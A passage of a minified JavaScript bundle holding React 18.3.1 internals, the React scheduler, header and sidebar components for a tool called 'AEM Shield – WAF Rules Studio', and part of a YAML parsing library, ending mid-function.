Jc(null,e,t,!0,n)},t.hydrateRoot=function(e,t,n){if(!Kc(e))throw Error(i(405));var r=null!=n&&n.hydratedSources||null,a=!1,s="",o=$c;if(null!==n&&void 0!==n&&(!0===n.unstable_strictMode&&(a=!0),void 0!==n.identifierPrefix&&(s=n.identifierPrefix),void 0!==n.onRecoverableError&&(o=n.onRecoverableError)),t=zc(t,null,e,1,null!=n?n:null,a,0,s,o),e[fa]=t.current,Wr(e),r)for(e=0;e<r.length;e++)a=(a=(n=r[e])._getVersion)(n._source),null==t.mutableSourceEagerHydrationData?t.mutableSourceEagerHydrationData=[n,a]:t.mutableSourceEagerHydrationData.push(n,a);return new Qc(t)},t.render=function(e,t,n){if(!Yc(t))throw Error(i(200));return Jc(null,e,t,!1,n)},t.unmountComponentAtNode=function(e){if(!Yc(e))throw Error(i(40));return!!e._reactRootContainer&&(cc(function(){Jc(null,null,e,!1,function(){e._reactRootContainer=null,e[fa]=null})}),!0)},t.unstable_batchedUpdates=lc,t.unstable_renderSubtreeIntoContainer=function(e,t,n,r){if(!Yc(n))throw Error(i(200));if(null==e||void 0===e._reactInternals)throw Error(i(38));return Jc(e,t,n,!1,r)},t.version="18.3.1-next-f1338f8080-20240426"},391(e,t,n){var r=n(950);t.createRoot=r.createRoot,t.hydrateRoot=r.hydrateRoot},950(e,t,n){!function e(){if("undefined"!==typeof __REACT_DEVTOOLS_GLOBAL_HOOK__&&"function"===typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE)try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(e)}catch(t){console.error(t)}}(),e.exports=n(730)},153(e,t,n){var r=n(43),a=Symbol.for("react.element"),i=Symbol.for("react.fragment"),s=Object.prototype.hasOwnProperty,o=r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,l={key:!0,ref:!0,__self:!0,__source:!0};function c(e,t,n){var r,i={},c=null,u=null;for(r in void 0!==n&&(c=""+n),void 0!==t.key&&(c=""+t.key),void 0!==t.ref&&(u=t.ref),t)s.call(t,r)&&!l.hasOwnProperty(r)&&(i[r]=t[r]);if(e&&e.defaultProps)for(r in t=e.defaultProps)void 0===i[r]&&(i[r]=t[r]);return{$$typeof:a,type:e,key:c,ref:u,props:i,_owner:o.current}}t.Fragment=i,t.jsx=c,t.jsxs=c},202(e,t){var n=Symbol.for("react.element"),r=Symbol.for("react.portal"),a=Symbol.for("react.fragment"),i=Symbol.for("react.strict_mode"),s=Symbol.for("react.profiler"),o=Symbol.for("react.provider"),l=Symbol.for("react.context"),c=Symbol.for("react.forward_ref"),u=Symbol.for("react.suspense"),d=Symbol.for("react.memo"),p=Symbol.for("react.lazy"),h=Symbol.iterator;var f={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},m=Object.assign,g={};function y(e,t,n){this.props=e,this.context=t,this.refs=g,this.updater=n||f}function v(){}function x(e,t,n){this.props=e,this.context=t,this.refs=g,this.updater=n||f}y.prototype.isReactComponent={},y.prototype.setState=function(e,t){if("object"!==typeof e&&"function"!==typeof e&&null!=e)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")},y.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")},v.prototype=y.prototype;var b=x.prototype=new v;b.constructor=x,m(b,y.prototype),b.isPureReactComponent=!0;var w=Array.isArray,k=Object.prototype.hasOwnProperty,j={current:null},N={key:!0,ref:!0,__self:!0,__source:!0};function S(e,t,r){var a,i={},s=null,o=null;if(null!=t)for(a in void 0!==t.ref&&(o=t.ref),void 0!==t.key&&(s=""+t.key),t)k.call(t,a)&&!N.hasOwnProperty(a)&&(i[a]=t[a]);var l=arguments.length-2;if(1===l)i.children=r;else if(1<l){for(var c=Array(l),u=0;u<l;u++)c[u]=arguments[u+2];i.children=c}if(e&&e.defaultProps)for(a in l=e.defaultProps)void 0===i[a]&&(i[a]=l[a]);return{$$typeof:n,type:e,key:s,ref:o,props:i,_owner:j.current}}function C(e){return"object"===typeof e&&null!==e&&e.$$typeof===n}var A=/\/+/g;function P(e,t){return"object"===typeof e&&null!==e&&null!=e.key?function(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(e){return t[e]})}(""+e.key):t.toString(36)}function T(e,t,a,i,s){var o=typeof e;"undefined"!==o&&"boolean"!==o||(e=null);var l=!1;if(null===e)l=!0;else switch(o){case"string":case"number":l=!0;break;case"object":switch(e.$$typeof){case n:case r:l=!0}}if(l)return s=s(l=e),e=""===i?"."+P(l,0):i,w(s)?(a="",null!=e&&(a=e.replace(A,"$&/")+"/"),T(s,t,a,"",function(e){return e})):null!=s&&(C(s)&&(s=function(e,t){return{$$typeof:n,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}(s,a+(!s.key||l&&l.key===s.key?"":(""+s.key).replace(A,"$&/")+"/")+e)),t.push(s)),1;if(l=0,i=""===i?".":i+":",w(e))for(var c=0;c<e.length;c++){var u=i+P(o=e[c],c);l+=T(o,t,a,u,s)}else if(u=function(e){return null===e||"object"!==typeof e?null:"function"===typeof(e=h&&e[h]||e["@@iterator"])?e:null}(e),"function"===typeof u)for(e=u.call(e),c=0;!(o=e.next()).done;)l+=T(o=o.value,t,a,u=i+P(o,c++),s);else if("object"===o)throw t=String(e),Error("Objects are not valid as a React child (found: "+("[object Object]"===t?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return l}function q(e,t,n){if(null==e)return e;var r=[],a=0;return T(e,r,"","",function(e){return t.call(n,e,a++)}),r}function E(e){if(-1===e._status){var t=e._result;(t=t()).then(function(t){0!==e._status&&-1!==e._status||(e._status=1,e._result=t)},function(t){0!==e._status&&-1!==e._status||(e._status=2,e._result=t)}),-1===e._status&&(e._status=0,e._result=t)}if(1===e._status)return e._result.default;throw e._result}var L={current:null},R={transition:null},O={ReactCurrentDispatcher:L,ReactCurrentBatchConfig:R,ReactCurrentOwner:j};function F(){throw Error("act(...) is not supported in production builds of React.")}t.Children={map:q,forEach:function(e,t,n){q(e,function(){t.apply(this,arguments)},n)},count:function(e){var t=0;return q(e,function(){t++}),t},toArray:function(e){return q(e,function(e){return e})||[]},only:function(e){if(!C(e))throw Error("React.Children.only expected to receive a single React element child.");return e}},t.Component=y,t.Fragment=a,t.Profiler=s,t.PureComponent=x,t.StrictMode=i,t.Suspense=u,t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=O,t.act=F,t.cloneElement=function(e,t,r){if(null===e||void 0===e)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var a=m({},e.props),i=e.key,s=e.ref,o=e._owner;if(null!=t){if(void 0!==t.ref&&(s=t.ref,o=j.current),void 0!==t.key&&(i=""+t.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(c in t)k.call(t,c)&&!N.hasOwnProperty(c)&&(a[c]=void 0===t[c]&&void 0!==l?l[c]:t[c])}var c=arguments.length-2;if(1===c)a.children=r;else if(1<c){l=Array(c);for(var u=0;u<c;u++)l[u]=arguments[u+2];a.children=l}return{$$typeof:n,type:e.type,key:i,ref:s,props:a,_owner:o}},t.createContext=function(e){return(e={$$typeof:l,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null}).Provider={$$typeof:o,_context:e},e.Consumer=e},t.createElement=S,t.createFactory=function(e){var t=S.bind(null,e);return t.type=e,t},t.createRef=function(){return{current:null}},t.forwardRef=function(e){return{$$typeof:c,render:e}},t.isValidElement=C,t.lazy=function(e){return{$$typeof:p,_payload:{_status:-1,_result:e},_init:E}},t.memo=function(e,t){return{$$typeof:d,type:e,compare:void 0===t?null:t}},t.startTransition=function(e){var t=R.transition;R.transition={};try{e()}finally{R.transition=t}},t.unstable_act=F,t.useCallback=function(e,t){return L.current.useCallback(e,t)},t.useContext=function(e){return L.current.useContext(e)},t.useDebugValue=function(){},t.useDeferredValue=function(e){return L.current.useDeferredValue(e)},t.useEffect=function(e,t){return L.current.useEffect(e,t)},t.useId=function(){return L.current.useId()},t.useImperativeHandle=function(e,t,n){return L.current.useImperativeHandle(e,t,n)},t.useInsertionEffect=function(e,t){return L.current.useInsertionEffect(e,t)},t.useLayoutEffect=function(e,t){return L.current.useLayoutEffect(e,t)},t.useMemo=function(e,t){return L.current.useMemo(e,t)},t.useReducer=function(e,t,n){return L.current.useReducer(e,t,n)},t.useRef=function(e){return L.current.useRef(e)},t.useState=function(e){return L.current.useState(e)},t.useSyncExternalStore=function(e,t,n){return L.current.useSyncExternalStore(e,t,n)},t.useTransition=function(){return L.current.useTransition()},t.version="18.3.1"},43(e,t,n){e.exports=n(202)},579(e,t,n){e.exports=n(153)},234(e,t){function n(e,t){var n=e.length;e.push(t);e:for(;0<n;){var r=n-1>>>1,a=e[r];if(!(0<i(a,t)))break e;e[r]=t,e[n]=a,n=r}}function r(e){return 0===e.length?null:e[0]}function a(e){if(0===e.length)return null;var t=e[0],n=e.pop();if(n!==t){e[0]=n;e:for(var r=0,a=e.length,s=a>>>1;r<s;){var o=2*(r+1)-1,l=e[o],c=o+1,u=e[c];if(0>i(l,n))c<a&&0>i(u,l)?(e[r]=u,e[c]=n,r=c):(e[r]=l,e[o]=n,r=o);else{if(!(c<a&&0>i(u,n)))break e;e[r]=u,e[c]=n,r=c}}}return t}function i(e,t){var n=e.sortIndex-t.sortIndex;return 0!==n?n:e.id-t.id}if("object"===typeof performance&&"function"===typeof performance.now){var s=performance;t.unstable_now=function(){return s.now()}}else{var o=Date,l=o.now();t.unstable_now=function(){return o.now()-l}}var c=[],u=[],d=1,p=null,h=3,f=!1,m=!1,g=!1,y="function"===typeof setTimeout?setTimeout:null,v="function"===typeof clearTimeout?clearTimeout:null,x="undefined"!==typeof setImmediate?setImmediate:null;function b(e){for(var t=r(u);null!==t;){if(null===t.callback)a(u);else{if(!(t.startTime<=e))break;a(u),t.sortIndex=t.expirationTime,n(c,t)}t=r(u)}}function w(e){if(g=!1,b(e),!m)if(null!==r(c))m=!0,R(k);else{var t=r(u);null!==t&&O(w,t.startTime-e)}}function k(e,n){m=!1,g&&(g=!1,v(C),C=-1),f=!0;var i=h;try{for(b(n),p=r(c);null!==p&&(!(p.expirationTime>n)||e&&!T());){var s=p.callback;if("function"===typeof s){p.callback=null,h=p.priorityLevel;var o=s(p.expirationTime<=n);n=t.unstable_now(),"function"===typeof o?p.callback=o:p===r(c)&&a(c),b(n)}else a(c);p=r(c)}if(null!==p)var l=!0;else{var d=r(u);null!==d&&O(w,d.startTime-n),l=!1}return l}finally{p=null,h=i,f=!1}}"undefined"!==typeof navigator&&void 0!==navigator.scheduling&&void 0!==navigator.scheduling.isInputPending&&navigator.scheduling.isInputPending.bind(navigator.scheduling);var j,N=!1,S=null,C=-1,A=5,P=-1;function T(){return!(t.unstable_now()-P<A)}function q(){if(null!==S){var e=t.unstable_now();P=e;var n=!0;try{n=S(!0,e)}finally{n?j():(N=!1,S=null)}}else N=!1}if("function"===typeof x)j=function(){x(q)};else if("undefined"!==typeof MessageChannel){var E=new MessageChannel,L=E.port2;E.port1.onmessage=q,j=function(){L.postMessage(null)}}else j=function(){y(q,0)};function R(e){S=e,N||(N=!0,j())}function O(e,n){C=y(function(){e(t.unstable_now())},n)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(e){e.callback=null},t.unstable_continueExecution=function(){m||f||(m=!0,R(k))},t.unstable_forceFrameRate=function(e){0>e||125<e?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):A=0<e?Math.floor(1e3/e):5},t.unstable_getCurrentPriorityLevel=function(){return h},t.unstable_getFirstCallbackNode=function(){return r(c)},t.unstable_next=function(e){switch(h){case 1:case 2:case 3:var t=3;break;default:t=h}var n=h;h=t;try{return e()}finally{h=n}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(e,t){switch(e){case 1:case 2:case 3:case 4:case 5:break;default:e=3}var n=h;h=e;try{return t()}finally{h=n}},t.unstable_scheduleCallback=function(e,a,i){var s=t.unstable_now();switch("object"===typeof i&&null!==i?i="number"===typeof(i=i.delay)&&0<i?s+i:s:i=s,e){case 1:var o=-1;break;case 2:o=250;break;case 5:o=1073741823;break;case 4:o=1e4;break;default:o=5e3}return e={id:d++,callback:a,priorityLevel:e,startTime:i,expirationTime:o=i+o,sortIndex:-1},i>s?(e.sortIndex=i,n(u,e),null===r(c)&&e===r(u)&&(g?(v(C),C=-1):g=!0,O(w,i-s))):(e.sortIndex=o,n(c,e),m||f||(m=!0,R(k))),e},t.unstable_shouldYield=T,t.unstable_wrapCallback=function(e){var t=h;return function(){var n=h;h=t;try{return e.apply(this,arguments)}finally{h=n}}}},853(e,t,n){e.exports=n(234)}},t={};function n(r){var a=t[r];if(void 0!==a)return a.exports;var i=t[r]={exports:{}};return e[r](i,i.exports,n),i.exports}var r=n(43),a=n(391),i=n(579);const s=()=>{const[e,t]=(0,r.useState)("dark");(0,r.useEffect)(()=>{const e=localStorage.getItem("aem-shield-theme")||"dark";t(e),document.documentElement.setAttribute("data-theme",e)},[]);return(0,i.jsxs)("header",{className:"header",children:[(0,i.jsxs)("div",{className:"header-brand",children:[(0,i.jsx)("div",{className:"header-logo",children:(0,i.jsxs)("svg",{viewBox:"0 0 32 32",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,i.jsx)("rect",{width:"32",height:"32",rx:"6",fill:"url(#logo-gradient)"}),(0,i.jsx)("path",{d:"M16 6L8 26h4l2-5h4l2 5h4L16 6zm0 7l2 5h-4l2-5z",fill:"white"}),(0,i.jsx)("path",{d:"M23 11l3 3-3 3",stroke:"white",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,i.jsx)("path",{d:"M9 11l-3 3 3 3",stroke:"white",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,i.jsx)("defs",{children:(0,i.jsxs)("linearGradient",{id:"logo-gradient",x1:"0",y1:"0",x2:"32",y2:"32",gradientUnits:"userSpaceOnUse",children:[(0,i.jsx)("stop",{stopColor:"#e94560"}),(0,i.jsx)("stop",{offset:"1",stopColor:"#0f3460"})]})})]})}),(0,i.jsxs)("div",{className:"header-title",children:[(0,i.jsx)("h1",{children:"AEM Shield"}),(0,i.jsx)("span",{className:"header-subtitle",children:"WAF Rules Studio"})]})]}),(0,i.jsx)("div",{className:"header-center",children:(0,i.jsxs)("span",{className:"header-env-badge",children:[(0,i.jsx)("span",{className:"env-indicator"}),"Adobe Experience Manager Cloud Service"]})}),(0,i.jsxs)("div",{className:"header-actions",children:[(0,i.jsx)("button",{className:"header-btn",title:"Adobe Documentation",onClick:()=>{window.open("https://experienceleague.adobe.com/en/docs/experience-manager-cloud-service/content/security/traffic-filter-rules-including-waf","_blank")},children:(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,i.jsx)("path",{d:"M4 19.5A2.5 2.5 0 0 1 6.5 17H20"}),(0,i.jsx)("path",{d:"M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"})]})}),(0,i.jsx)("button",{className:"header-btn ".concat("light"===e?"active":""),title:"Switch to ".concat("dark"===e?"light":"dark"," mode"),onClick:()=>{const n="dark"===e?"light":"dark";t(n),localStorage.setItem("aem-shield-theme",n),document.documentElement.setAttribute("data-theme",n)},children:"dark"===e?(0,i.jsxs)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,i.jsx)("circle",{cx:"12",cy:"12",r:"5"}),(0,i.jsx)("line",{x1:"12",y1:"1",x2:"12",y2:"3"}),(0,i.jsx)("line",{x1:"12",y1:"21",x2:"12",y2:"23"}),(0,i.jsx)("line",{x1:"4.22",y1:"4.22",x2:"5.64",y2:"5.64"}),(0,i.jsx)("line",{x1:"18.36",y1:"18.36",x2:"19.78",y2:"19.78"}),(0,i.jsx)("line",{x1:"1",y1:"12",x2:"3",y2:"12"}),(0,i.jsx)("line",{x1:"21",y1:"12",x2:"23",y2:"12"}),(0,i.jsx)("line",{x1:"4.22",y1:"19.78",x2:"5.64",y2:"18.36"}),(0,i.jsx)("line",{x1:"18.36",y1:"5.64",x2:"19.78",y2:"4.22"})]}):(0,i.jsx)("svg",{width:"18",height:"18",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:(0,i.jsx)("path",{d:"M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"})})})]})]})},o=e=>{let{activeView:t,onViewChange:n}=e;const r=[{id:"dashboard",label:"Dashboard",icon:(0,i.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,i.jsx)("rect",{x:"3",y:"3",width:"7",height:"7"}),(0,i.jsx)("rect",{x:"14",y:"3",width:"7",height:"7"}),(0,i.jsx)("rect",{x:"14",y:"14",width:"7",height:"7"}),(0,i.jsx)("rect",{x:"3",y:"14",width:"7",height:"7"})]})},{id:"analyzer",label:"Rules Analyzer",icon:(0,i.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[(0,i.jsx)("circle",{cx:"11",cy:"11",r:"8"}),(0,i.jsx)("path",{d:"m21 21-4.35-4.35"}),(0,i.jsx)("path",{d:"M11 8v6"}),(0,i.jsx)("path",{d:"M8 11h6"})]})},{id:"generator",label:"Rules Generator",icon:(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:(0,i.jsx)("path",{d:"M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"})})},{id:"simulator",label:"Rules Simulator",icon:(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:(0,i.jsx)("polygon",{points:"5 3 19 12 5 21 5 3"})})}];return(0,i.jsxs)("aside",{className:"sidebar",children:[(0,i.jsx)("nav",{className:"sidebar-nav",children:(0,i.jsx)("ul",{className:"nav-list",children:r.map(e=>(0,i.jsx)("li",{children:(0,i.jsxs)("button",{className:"nav-item ".concat(t===e.id?"active":""),onClick:()=>n(e.id),children:[(0,i.jsx)("span",{className:"nav-icon",children:e.icon}),(0,i.jsx)("span",{className:"nav-label",children:e.label}),t===e.id&&(0,i.jsx)("span",{className:"nav-indicator"})]})},e.id))})}),(0,i.jsx)("div",{className:"sidebar-footer",children:(0,i.jsxs)("div",{className:"sidebar-info",children:[(0,i.jsx)("div",{className:"info-icon",children:(0,i.jsx)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:(0,i.jsx)("path",{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"})})}),(0,i.jsxs)("div",{className:"info-text",children:[(0,i.jsx)("span",{className:"info-label",children:"Extended Security"}),(0,i.jsx)("span",{className:"info-value",children:"WAF-DDoS Protection"})]})]})})]})};function l(e){return"undefined"===typeof e||null===e}var c={isNothing:l,isObject:function(e){return"object"===typeof e&&null!==e},toArray:function(e){return Array.isArray(e)?e:l(e)?[]:[e]},repeat:function(e,t){var n,r="";for(n=0;n<t;n+=1)r+=e;return r},isNegativeZero:function(e){return 0===e&&Number.NEGATIVE_INFINITY===1/e},extend:function(e,t){var n,r,a,i;if(t)for(n=0,r=(i=Object.keys(t)).length;n<r;n+=1)e[a=i[n]]=t[a];return e}};function u(e,t){var n="",r=e.reason||"(unknown reason)";return e.mark?(e.mark.name&&(n+='in "'+e.mark.name+'" '),n+="("+(e.mark.line+1)+":"+(e.mark.column+1)+")",!t&&e.mark.snippet&&(n+="\n\n"+e.mark.snippet),r+" "+n):r}function d(e,t){Error.call(this),this.name="YAMLException",this.reason=e,this.mark=t,this.message=u(this,!1),Error.captureStackTrace?Error.captureStackTrace(this,this.constructor):this.stack=(new Error).stack||""}d.prototype=Object.create(Error.prototype),d.prototype.constructor=d,d.prototype.toString=function(e){return this.name+": "+u(this,e)};var p=d;function h(e,t,n,r,a){var i="",s="",o=Math.floor(a/2)-1;return r-t>o&&(t=r-o+(i=" ... ").length),n-r>o&&(n=r+o-(s=" ...").length),{str:i+e.slice(t,n).replace(/\t/g,"\u2192")+s,pos:r-t+i.length}}function f(e,t){return c.repeat(" ",t-e.length)+e}var m=function(e,t){if(t=Object.create(t||null),!e.buffer)return null;t.maxLength||(t.maxLength=79),"number"!==typeof t.indent&&(t.indent=1),"number"!==typeof t.linesBefore&&(t.linesBefore=3),"number"!==typeof t.linesAfter&&(t.linesAfter=2);for(var n,r=/\r?\n|\r|\0/g,a=[0],i=[],s=-1;n=r.exec(e.buffer);)i.push(n.index),a.push(n.index+n[0].length),e.position<=n.index&&s<0&&(s=a.length-2);s<0&&(s=a.length-1);var o,l,u="",d=Math.min(e.line+t.linesAfter,i.length).toString().length,p=t.maxLength-(t.indent+d+3);for(o=1;o<=t.linesBefore&&!(s-o<0);o++)l=h(e.buffer,a[s-o],i[s-o],e.position-(a[s]-a[s-o]),p),u=c.repeat(" ",t.indent)+f((e.line-o+1).toString(),d)+" | "+l.str+"\n"+u;for(l=h(e.buffer,a[s],i[s],e.position,p),u+=c.repeat(" ",t.indent)+f((e.line+1).toString(),d)+" | "+l.str+"\n",u+=c.repeat("-",t.indent+d+3+l.pos)+"^\n",o=1;o<=t.linesAfter&&!(s+o>=i.length);o++)l=h(e.buffer,a[s+o],i[s+o],e.position-(a[s]-a[s+o]),p),u+=c.repeat(" ",t.indent)+f((e.line+o+1).toString(),d)+" | "+l.str+"\n";return u.replace(/\n$/,"")},g=["kind","multi","resolve","construct","instanceOf","predicate","represent","representName","defaultStyle","styleAliases"],y=["scalar","sequence","mapping"];var v=function(e,t){if(t=t||{},Object.keys(t).forEach(function(t){if(-1===g.indexOf(t))throw new p('Unknown option "'+t+'" is met in definition of "'+e+'" YAML type.')}),this.options=t,this.tag=e,this.kind=t.kind||null,this.resolve=t.resolve||function(){return!0},this.construct=t.construct||function(e){return e},this.instanceOf=t.instanceOf||null,this.predicate=t.predicate||null,this.represent=t.represent||null,this.representName=t.representName||null,this.defaultStyle=t.defaultStyle||null,this.multi=t.multi||!1,this.styleAliases=function(e){var t={};return null!==e&&Object.keys(e).forEach(function(n){e[n].forEach(function(e){t[String(e)]=n})}),t}(t.styleAliases||null),-1===y.indexOf(this.kind))throw new p('Unknown kind "'+this.kind+'" is specified for "'+e+'" YAML type.')};function x(e,t){var n=[];return e[t].forEach(function(e){var t=n.length;n.forEach(function(n,r){n.tag===e.tag&&n.kind===e.kind&&n.multi===e.multi&&(t=r)}),n[t]=e}),n}function b(e){return this.extend(e)}b.prototype.extend=function(e){var t=[],n=[];if(e instanceof v)n.push(e);else if(Array.isArray(e))n=n.concat(e);else{if(!e||!Array.isArray(e.implicit)&&!Array.isArray(e.explicit))throw new p("Schema.extend argument should be a Type, [ Type ], or a schema definition ({ implicit: [...], explicit: [...] })");e.implicit&&(t=t.concat(e.implicit)),e.explicit&&(n=n.concat(e.explicit))}t.forEach(function(e){if(!(e instanceof v))throw new p("Specified list of YAML types (or a single Type object) contains a non-Type object.");if(e.loadKind&&"scalar"!==e.loadKind)throw new p("There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported.");if(e.multi)throw new p("There is a multi type in the implicit list of a schema. Multi tags can only be listed as explicit.")}),n.forEach(function(e){if(!(e instanceof v))throw new p("Specified list of YAML types (or a single Type object) contains a non-Type object.")});var r=Object.create(b.prototype);return r.implicit=(this.implicit||[]).concat(t),r.explicit=(this.explicit||[]).concat(n),r.compiledImplicit=x(r,"implicit"),r.compiledExplicit=x(r,"explicit"),r.compiledTypeMap=function(){var e,t,n={scalar:{},sequence:{},mapping:{},fallback:{},multi:{scalar:[],sequence:[],mapping:[],fallback:[]}};function r(e){e.multi?(n.multi[e.kind].push(e),n.multi.fallback.push(e)):n[e.kind][e.tag]=n.fallback[e.tag]=e}for(e=0,t=arguments.length;e<t;e+=1)arguments[e].forEach(r);return n}(r.compiledImplicit,r.compiledExplicit),r};var w=b,k=new v("tag:yaml.org,2002:str",{kind:"scalar",construct:function(e){return null!==e?e:""}}),j=new v("tag:yaml.org,2002:seq",{kind:"sequence",construct:function(e){return null!==e?e:[]}}),N=new v("tag:yaml.org,2002:map",{kind:"mapping",construct:function(e){return null!==e?e:{}}}),S=new w({explicit:[k,j,N]});var C=new v("tag:yaml.org,2002:null",{kind:"scalar",resolve:function(e){if(null===e)return!0;var t=e.length;return 1===t&&"~"===e||4===t&&("null"===e||"Null"===e||"NULL"===e)},construct:function(){return null},predicate:function(e){return null===e},represent:{canonical:function(){return"~"},lowercase:function(){return"null"},uppercase:function(){return"NULL"},camelcase:function(){return"Null"},empty:function(){return""}},defaultStyle:"lowercase"});var A=new v("tag:yaml.org,2002:bool",{kind:"scalar",resolve:function(e){if(null===e)return!1;var t=e.length;return 4===t&&("true"===e||"True"===e||"TRUE"===e)||5===t&&("false"===e||"False"===e||"FALSE"===e)},construct:function(e){return"true"===e||"True"===e||"TRUE"===e},predicate:function(e){return"[object Boolean]"===Object.prototype.toString.call(e)},represent:{lowercase:function(e){return e?"true":"false"},uppercase:function(e){return e?"TRUE":"FALSE"},camelcase:function(e){return e?"True":"False"}},defaultStyle:"lowercase"});function P(e){return 48<=e&&e<=57||65<=e&&e<=70||97<=e&&e<=102}function T(e){return 48<=e&&e<=55}function q(e){return 48<=e&&e<=57}var E=new v("tag:yaml.org,2002:int",{kind:"scalar",resolve:function(e){if(null===e)return!1;var t,n=e.length,r=0,a=!1;if(!n)return!1;if("-"!==(t=e[r])&&"+"!==t||(t=e[++r]),"0"===t){if(r+1===n)return!0;if("b"===(t=e[++r])){for(r++;r<n;r++)if("_"!==(t=e[r])){if("0"!==t&&"1"!==t)return!1;a=!0}return a&&"_"!==t}if("x"===t){for(r++;r<n;r++)if("_"!==(t=e[r])){if(!P(e.charCodeAt(r)))return!1;a=!0}return a&&"_"!==t}if("o"===t){for(r++;r<n;r++)if("_"!==(t=e[r])){if(!T(e.charCodeAt(r)))return!1;a=!0}return a&&"_"!==t}}if("_"===t)return!1;for(;r<n;r++)if("_"!==(t=e[r])){if(!q(e.charCodeAt(r)))return!1;a=!0}return!(!a||"_"===t)},construct:function(e){var t,n=e,r=1;if(-1!==n.indexOf("_")&&(n=n.replace(/_/g,"")),"-"!==(t=n[0])&&"+"!==t||("-"===t&&(r=-1),t=(n=n.slice(1))[0]),"0"===n)return 0;if("0"===t){if("b"===n[1])return r*parseInt(n.slice(2),2);if("x"===n[1])return r*parseInt(n.slice(2),16);if("o"===n[1])return r*parseInt(n.slice(2),8)}return r*parseInt(n,10)},predicate:function(e){return"[object Number]"===Object.prototype.toString.call(e)&&e%1===0&&!c.isNegativeZero(e)},represent:{binary:function(e){return e>=0?"0b"+e.toString(2):"-0b"+e.toString(2).slice(1)},octal:function(e){return e>=0?"0o"+e.toString(8):"-0o"+e.toString(8).slice(1)},decimal:function(e){return e.toString(10)},hexadecimal:function(e){return e>=0?"0x"+e.toString(16).toUpperCase():"-0x"+e.toString(16).toUpperCase().slice(1)}},defaultStyle:"decimal",styleAliases:{binary:[2,"bin"],octal:[8,"oct"],decimal:[10,"dec"],hexadecimal:[16,"hex"]}}),L=new RegExp("^(?:[-+]?(?:[0-9][0-9_]*)(?:\\.[0-9_]*)?(?:[eE][-+]?[0-9]+)?|\\.[0-9_]+(?:[eE][-+]?[0-9]+)?|[-+]?\\.(?:inf|Inf|INF)|\\.(?:nan|NaN|NAN))$");var R=/^[-+]?[0-9]+e/;var O=new v("tag:yaml.org,2002:float",{kind:"scalar",resolve:function(e){return null!==e&&!(!L.test(e)||"_"===e[e.length-1])},construct:function(e){var t,n;return n="-"===(t=e.replace(/_/g,"").toLowerCase())[0]?-1:1,"+-".indexOf(t[0])>=0&&(t=t.slice(1)),".inf"===t?1===n?Number.POSITIVE_INFINITY:Number.NEGATIVE_INFINITY:".nan"===t?NaN:n*parseFloat(t,10)},predicate:function(e){return"[object Number]"===Object.prototype.toString.call(e)&&(e%1!==0||c.isNegativeZero(e))},represent:function(e,t){var n;if(isNaN(e))switch(t){case"lowercase":return".nan";case"uppercase":return".NAN";case"camelcase":return".NaN"}else if(Number.POSITIVE_INFINITY===e)switch(t){case"lowercase":return".inf";case"uppercase":return".INF";case"camelcase":return".Inf"}else if(Number.NEGATIVE_INFINITY===e)switch(t){case"lowercase":return"-.inf";case"uppercase":return"-.INF";case"camelcase":return"-.Inf"}else if(c.isNegativeZero(e))return"-0.0";return 